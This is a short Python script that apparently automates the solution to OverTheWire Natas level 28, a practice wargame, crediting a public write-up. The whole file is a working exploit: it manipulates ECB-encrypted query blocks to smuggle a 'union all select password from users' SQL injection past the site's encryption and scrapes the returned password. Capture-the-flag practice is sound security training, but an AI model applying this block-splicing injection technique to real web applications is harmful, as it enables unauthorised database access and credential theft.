# this solution comes from https://axcheron.github.io/writeups/otw/natas/#natas-28-solution

import base64
import re
from urllib import parse

from config import password_length
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 28


def get_secret():
    req = get_request_object(level_number)
    result = req.post(get_level_url(level_number), data={"query": " " * 10})
    baseline = base64.b64decode(parse.unquote(result.url.split("=")[1]))
    header = baseline[:48]
    footer = baseline[48:]

    sql = " " * 9 + "' union all select password from users;#"
    result = req.post(get_level_url(level_number), data={"query": sql})
    exploit = base64.b64decode(parse.unquote(result.url.split("=")[1]))
    ciphertext = base64.b64encode(header + exploit[48:96] + footer)
    result = req.get(get_level_url(level_number) + "/search.php", params={"query": ciphertext})
    pattern = "<[^<]+?>"
    text = re.sub(pattern, "", result.text)
    search = "Whack Computer Joke Database"

    if search in text:
        start_index = text.find(search) + len(search)
        return text[start_index: start_index + password_length]
    else:
        return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)
